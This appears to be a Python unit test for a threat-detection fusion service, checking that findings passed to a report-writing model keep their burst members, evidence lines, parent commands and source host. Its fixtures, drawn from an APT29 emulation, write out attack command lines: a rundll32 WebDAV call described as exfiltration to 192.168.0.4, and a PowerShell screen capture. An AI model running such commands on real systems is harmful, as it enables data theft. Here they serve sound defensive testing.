"""The report model gets what fusion found: burst members, medium evidence, the parent.

APT29 Day 1 (2026-10-14 audit): the SCRANTON burst held screen capture, clipboard capture
and the WebDAV exfil to 192.168.0.4, but the model only got the burst's title -- the
report missed all three and said "no outbound destination is provided". Medium findings
got no evidence lines at all, and the parent command was cut from every line, so every
report said "the parent process is not identified".
"""
import os
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
for _p in (os.path.join(ROOT, "tests"), os.path.join(ROOT, "modules/backend")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import _optional_deps  # noqa: F401,E402
from services.fusion import render, schema  # noqa: E402
from services.fusion.correlate import _event_part  # noqa: E402

TS = "2020-05-02T03:08:00Z"


def ev(eid, title, sev, cmd, details):
    return schema.Entity(id=eid, type="event", label=title, severity=sev, first_seen=TS,
                         attrs={"title": title, "ev_cmdline": cmd, "details": details,
                                "_assets": ["asset:scranton"]}, flags=["sigma"])


def graph():
    g = schema.FusionGraph(case_id="t")
    g.upsert(schema.Entity(id="asset:scranton", type="asset", label="SCRANTON"))
    web = ev("ev:webdav", "WebDav Client Execution", "medium",
             "rundll32.exe C:\\Windows\\system32\\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",
             "Cmdline: rundll32.exe davclnt.dll ¦ ParentCmdline: svchost.exe -k LocalService ¦ SrcComp: SCRANTON")
    scr = ev("ev:screen", "Windows Screen Capture with CopyFromScreen", "medium",
             "powershell.exe -c [Drawing.Graphics]::CopyFromScreen()",
             "Cmdline: powershell ¦ ParentCmdline: C:\\ProgramData\\victim\\cod.3aka3.scr")
    for e in (web, scr):
        g.upsert(e)
    burst = schema.Finding(id="f_burst", title="Burst of 2 detections — WebDav Client Execution on SCRANTON",
                           severity="high", confidence="high", summary="2 detections", ts=TS,
                           entity_ids=[web.id, scr.id], asset_ids=["asset:scranton"], kind="derived",
                           parts=[_event_part(web, web.label), _event_part(scr, scr.label)])
    lone = schema.Finding(id="f_med", title="Rundll32 Spawned Via Explorer", severity="medium",
                          confidence="medium", summary="medium finding", ts=TS, entity_ids=[scr.id],
                          asset_ids=["asset:scranton"])
    g.findings = [burst, lone]
    return g


def finding(payload, title):
    return next(f for f in payload["findings"] if f["title"].startswith(title))


class ReportSeesWhatFusionFound(unittest.TestCase):
    def setUp(self):
        self.p = render.distilled(graph(), detail="explicit")

    def test_every_burst_member_reaches_the_model_with_its_evidence(self):
        mem = finding(self.p, "Burst of 2")["members"]
        self.assertEqual({"WebDav Client Execution", "Windows Screen Capture with CopyFromScreen"},
                         {m["title"] for m in mem})
        web = next(m for m in mem if m["title"].startswith("WebDav"))
        self.assertIn("http://192.168.0.4/webdav", " ".join(web["evidence"]))

    def test_a_medium_finding_carries_evidence(self):
        self.assertTrue(finding(self.p, "Rundll32 Spawned").get("evidence"))

    def test_the_parent_command_survives_on_a_line_that_names_a_process(self):
        lines = " ".join(finding(self.p, "Rundll32 Spawned")["evidence"])
        self.assertIn("Parent command: C:\\ProgramData\\victim\\cod.3aka3.scr", lines)

    def test_source_computer_is_named(self):
        web = next(m for m in finding(self.p, "Burst of 2")["members"] if m["title"].startswith("WebDav"))
        self.assertIn("Source host: SCRANTON", " ".join(web["evidence"]))

    def test_the_summary_payload_is_unchanged(self):
        """Chat and the advisory use detail='summary': no evidence, no members there."""
        p = render.distilled(graph(), detail="summary")
        self.assertFalse(any("members" in f or "evidence" in f for f in p["findings"]))


if __name__ == "__main__":
    unittest.main()
